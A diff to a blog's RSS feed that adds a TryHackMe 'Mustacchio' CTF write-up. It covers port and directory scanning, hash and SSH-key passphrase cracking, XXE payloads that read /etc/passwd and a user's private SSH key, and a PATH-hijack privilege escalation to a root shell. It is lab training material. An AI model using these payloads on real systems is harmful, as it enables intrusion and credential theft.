@@ -6,7 +6,260 @@
         <description>Recent content on Tanishq Chaudhary</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Tue, 15 Jun 2021 00:00:00 +0000</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Wed, 16 Jun 2021 00:00:00 +0000</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>TryHackMe: Mustacchio Writeup</title>
+        <link>/p/tryhackme-mustacchio-writeup/</link>
+        <pubDate>Wed, 16 Jun 2021 00:00:00 +0000</pubDate>
+        
+        <guid>/p/tryhackme-mustacchio-writeup/</guid>
+        <description>&lt;img src="https://i.imgur.com/dorXlbA.png" alt="Featured image of post TryHackMe: Mustacchio Writeup" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/room_name_here&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Play&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;1-scanning--enumeration&#34;&gt;1. Scanning &amp;amp; Enumeration&lt;/h2&gt;
+&lt;p&gt;We do the below scans in parallel.&lt;/p&gt;
+&lt;h3 id=&#34;11-port-scanning&#34;&gt;1.1. Port Scanning&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;Not shown: 998 filtered ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 d3:9e:50:66:5f:27:a0:60:a7:e8:8b:cb:a9:2a:f0:19 (RSA)
+|   256 5f:98:f4:5d:dc:a1:ee:01:3e:91:65:0a:80:52:de:ef (ECDSA)
+|_  256 5e:17:6e:cd:44:35:a8:0b:46:18:cb:00:8d:49:b3:f6 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Mustacchio | Home
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Info Gathered:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;SSH open on 22&lt;/li&gt;
+&lt;li&gt;Post 80 with a website open&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;More information gathered later, as the full port scan takes a lot longer.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Not shown: 65532 filtered ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+8765/tcp open  ultraseek-http
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We could explore the last port later.&lt;/p&gt;
+&lt;h3 id=&#34;12-web-enumeration&#34;&gt;1.2. Web Enumeration&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
+└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x &#39;php,html,txt&#39; -t 32 -q -u 10.10.247.224
+/images               (Status: 301) [Size: 315] [--&amp;gt; http://10.10.247.224/images/]
+/about.html           (Status: 200) [Size: 3152]                                  
+/contact.html         (Status: 200) [Size: 1450]                                  
+/index.html           (Status: 200) [Size: 1752]                                  
+/blog.html            (Status: 200) [Size: 3172]                                  
+/gallery.html         (Status: 200) [Size: 1950]                                  
+/custom               (Status: 301) [Size: 315] [--&amp;gt; http://10.10.247.224/custom/]
+/robots.txt           (Status: 200) [Size: 28]                                    
+/fonts                (Status: 301) [Size: 314] [--&amp;gt; http://10.10.247.224/fonts/] 
+/server-status        (Status: 403) [Size: 278]  
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Info gathered:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;custom looks interesting&lt;/li&gt;
+&lt;li&gt;robots.txt usually contains intersting information&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;13-web-exploration&#34;&gt;1.3. Web Exploration&lt;/h3&gt;
+&lt;p&gt;The homepage.
+&lt;img src=&#34;https://i.imgur.com/yaN2Tqm.jpg&#34; alt=&#34;mustacchio homepage&#34;  /&gt;&lt;/p&gt;
+&lt;p&gt;We explore the &lt;code&gt;/custom/&lt;/code&gt; page, and get another &lt;code&gt;/js/&lt;/code&gt; directory onwards.
+&lt;img src=&#34;https://i.imgur.com/plsUh5V.png&#34; alt=&#34;mustacchio custom js webpage&#34;  /&gt;&lt;/p&gt;
+&lt;p&gt;I first looked in &lt;code&gt;users.bak&lt;/code&gt;. We get something interesting!&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
+└─$ cat users.bak              
+��r�CtableusersusersCREATE TABLE &amp;quot;users&amp;quot; (
+        &amp;quot;id&amp;quot;    INTEGER,
+        &amp;quot;username&amp;quot;      TEXT,
+        &amp;quot;password&amp;quot;      TEXT,
+        &amp;quot;role&amp;quot;  INTEGER
+��2     ]admin{hash_was_here_and_i_hid_it_lol} 
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;14-hash-cracking&#34;&gt;1.4. Hash Cracking&lt;/h3&gt;
+&lt;p&gt;Looks like a hash for the username &lt;code&gt;admin&lt;/code&gt;. But, of what kind?&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
+└─$ hashid {hash_was_here_and_i_hid_this_too}   
+Analyzing &#39;{yeee_hawww}&#39;
+[+] SHA-1 
+[+] Double SHA-1 
+[+] RIPEMD-160 
+[+] Haval-160 
+[+] Tiger-160 
+[+] HAS-160 
+[+] LinkedIn 
+[+] Skein-256(160) 
+[+] Skein-512(160) 
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Using john the ripper, we get the password XD&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
+└─$ ssh admin@10.10.247.224
+The authenticity of host &#39;10.10.247.224 (10.10.247.224)&#39; can&#39;t be established.
+ECDSA key fingerprint is SHA256:g//RSEsVCZF6FIydF0R24Gmek8fI6D7kRnDXF3fNK9Y.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#39;10.10.247.224&#39; (ECDSA) to the list of known hosts.
+admin@10.10.247.224: Permission denied (publickey).
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And &amp;hellip; we see that we are not allowed :( At this point, we have one last option left.&lt;/p&gt;
+&lt;h3 id=&#34;15-the-mystery-port--our-key-to-success&#34;&gt;1.5. The Mystery Port &amp;amp; Our &lt;em&gt;Key&lt;/em&gt; to Success&lt;/h3&gt;
+&lt;p&gt;Exploring the last port, we get some more information.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;PORT     STATE SERVICE VERSION
+8765/tcp open  http    nginx 1.10.3 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST
+|_http-server-header: nginx/1.10.3 (Ubuntu)
+|_http-title: Mustacchio | Login
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Let&amp;rsquo;s go!&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/xazt9n0.png&#34; alt=&#34;admin panel on the new port found&#34;  /&gt;&lt;/p&gt;
+&lt;p&gt;We see an admin panel! Recall, we already have the credentials :D&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/jYwwokH.jpg&#34; alt=&#34;a place to add comments in the admin panel&#34;  /&gt;&lt;/p&gt;
+&lt;p&gt;We see the following in the source code. &lt;code&gt;&amp;lt;!-- Barry, you can now SSH in using your key!--&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Now what?&lt;/p&gt;
+&lt;h3 id=&#34;16-xml&#34;&gt;1.6. XML&lt;/h3&gt;
+&lt;p&gt;I opened up burp-suite, and I got the following.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;POST /home.php HTTP/1.1
+Host: 10.10.247.224:8765
+...
+Connection: close
+
+xml=wow
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We have a comment box that looks like a place to enter XML text, as we see in the POST request.&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s try:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;
+&amp;lt;root&amp;gt;
+
+        &amp;lt;author&amp;gt;hacc&amp;lt;/author&amp;gt;
+        &amp;lt;name&amp;gt;Hackerman&amp;lt;/name&amp;gt;
+&amp;lt;/root&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/25wZkxA.png&#34; alt=&#34;getting shady xml code to work&#34;  /&gt;&lt;/p&gt;
+&lt;p&gt;Ey, Voila!&lt;/p&gt;
+&lt;p&gt;I looked around, and I got &lt;a class=&#34;link&#34; href=&#34;https://owasp.org/www-community/vulnerabilities/XML_External_Entity_%28XXE%29_Processing&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;OWASP XXE&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Now, we can craft a special tasty XXE attack.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;
+&amp;lt;!DOCTYPE author [&amp;lt;!ENTITY read SYSTEM &#39;file:///etc/passwd&#39;&amp;gt;]&amp;gt;
+&amp;lt;root&amp;gt;&amp;lt;author&amp;gt;&amp;amp;read;&amp;lt;/author&amp;gt;&amp;lt;/root&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Explaination:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;The first line is prolog&lt;/li&gt;
+&lt;li&gt;The second line specifies something of &lt;code&gt;author&lt;/code&gt;, containing the information of the system file &lt;code&gt;/etc/passwd&lt;/code&gt; in a variable called &lt;code&gt;read&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;When we ask to display the author, we can put the &lt;code&gt;&amp;amp;read;&lt;/code&gt; in between the tags. This then prints the desired output.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/Ohm5FNi.jpg&#34; alt=&#34;admin panel displaying the /etc/passwd&#34;  /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;17-ssh-keys&#34;&gt;1.7. SSH Keys&lt;/h3&gt;
+&lt;p&gt;Using the above listing, we find two users, &lt;code&gt;joe&lt;/code&gt; and &lt;code&gt;barry&lt;/code&gt;. We see the hint given to us in the source code, to login SSH using Barry as username.&lt;/p&gt;
+&lt;p&gt;We can modify the request as such:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;
+&amp;lt;!DOCTYPE author [&amp;lt;!ENTITY read SYSTEM &#39;file:///home/barry/.ssh/id_rsa&#39;&amp;gt;]&amp;gt;
+&amp;lt;root&amp;gt;
+&amp;lt;author&amp;gt;&amp;amp;read;&amp;lt;/author&amp;gt;
+&amp;lt;/root&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And we can get the private key! Use &lt;code&gt;chmod 600 id_rsa&lt;/code&gt; to assign appropriate permissions.&lt;/p&gt;
+&lt;h2 id=&#34;2-foothold&#34;&gt;2. Foothold&lt;/h2&gt;
+&lt;p&gt;Trying the key, we see that we need a passphrase. We can use &lt;code&gt;ssh2john&lt;/code&gt; for this.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
+└─$ locate ssh2john
+/usr/share/john/ssh2john.py
+
+┌──(kali㉿kali)-[/tmp]
+└─$ /usr/share/john/ssh2john.py id_rsa &amp;gt; hash
+       
+┌──(kali㉿kali)-[/tmp]
+└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt                    
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 6 OpenMP threads
+Note: This format may emit false positives, so it will keep trying even after
+finding a possible candidate.
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+{passphrase}       (id_rsa)
+1g 0:00:00:03 DONE (2021-06-12 10:53) 0.2754g/s 3950Kp/s 3950Kc/s 3950KC/s     1990..*7¡Vamos!
+Session completed
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Let&amp;rsquo;s login!&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
+└─$ ssh -i id_rsa barry@10.10.237.166
+Enter passphrase for key &#39;id_rsa&#39;: 
+Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-210-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+13 packages can be updated.
+10 of these updates are security updates.
+To see these additional updates run: apt list --upgradable
+
+
+Last login: Sat Jun 12 13:20:56 2021 from 10.17.8.184
+barry@mustacchio:~$ 
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;3-privesc&#34;&gt;3. PrivEsc&lt;/h2&gt;
+&lt;p&gt;Okay now what? Sudo we can&amp;rsquo;t touch. Crontab empty. Linux kernel tip top. SUID?&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;barry@mustacchio:~$ find / -type f -perm -u=s 2&amp;gt; /dev/null
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/snapd/snap-confine
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/bin/passwd
+/usr/bin/pkexec
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/at
+/usr/bin/chsh
+/usr/bin/newgidmap
+/usr/bin/sudo
+/usr/bin/newuidmap
+/usr/bin/gpasswd
+/home/joe/live_log
+/bin/ping
+/bin/ping6
+/bin/umount
+/bin/mount
+/bin/fusermount
+/bin/su
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Okay. So, &lt;code&gt;home/joe/live_log&lt;/code&gt; shows us the following.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;barry@mustacchio:~$ file /home/joe/live_log
+/home/joe/live_log: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6c03a68094c63347aeb02281a45518964ad12abe, for GNU/Linux 3.2.0, not stripped
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Okay, let&amp;rsquo;s execute.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;barry@mustacchio:~$ /home/joe/live_log
+10.17.8.184 - - [12/Jun/2021:09:09:41 +0000] &amp;quot;POST /home.php HTTP/1.1&amp;quot; 200 1123 &amp;quot;http://mustacchio.thm:8765/home.php&amp;quot; &amp;quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36&amp;quot;
+10.17.8.184 - - [12/Jun/2021:09:09:47 +0000] &amp;quot;POST /home.php HTTP/1.1&amp;quot; 200 1123 &amp;quot;http://mustacchio.thm:8765/home.php&amp;quot; &amp;quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36&amp;quot;
+...
+
+^CLive Nginx Log 
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It says it is &lt;code&gt;Live Nginx Log&lt;/code&gt;. We clearly need more information. What about the strings in the executable?&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;...
+Live Nginx Log Reader
+tail -f /var/log/nginx/access.log
+...
+crtstuff.c
+...
+demo.c
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Looks closely! We have &lt;code&gt;tail&lt;/code&gt; present. This is now a simle &lt;code&gt;PATH&lt;/code&gt; epxloit. 2 Simple steps.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;We add the current path in the &lt;code&gt;PATH&lt;/code&gt; environment variable.&lt;/li&gt;
+&lt;li&gt;We create an executable called &lt;code&gt;tail&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Step 1:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;barry@mustacchio:~$ echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+barry@mustacchio:~$ export PATH=$PWD:$PATH
+barry@mustacchio:~$ echo $PATH
+/home/barry:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Step 2:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;barry@mustacchio:~$ cat tail
+#!/usr/bin/python3
+import pty
+pty.spawn(&amp;quot;/bin/bash&amp;quot;)
+
+barry@mustacchio:~$ chmod +x tail
+barry@mustacchio:~$ /home/joe/live_log
+root@mustacchio:~# 
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;System Compromised!&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>TryHackMe: 0day Writeup</title>
         <link>/p/tryhackme-0day-writeup/</link>
         <pubDate>Tue, 15 Jun 2021 00:00:00 +0000</pubDate>
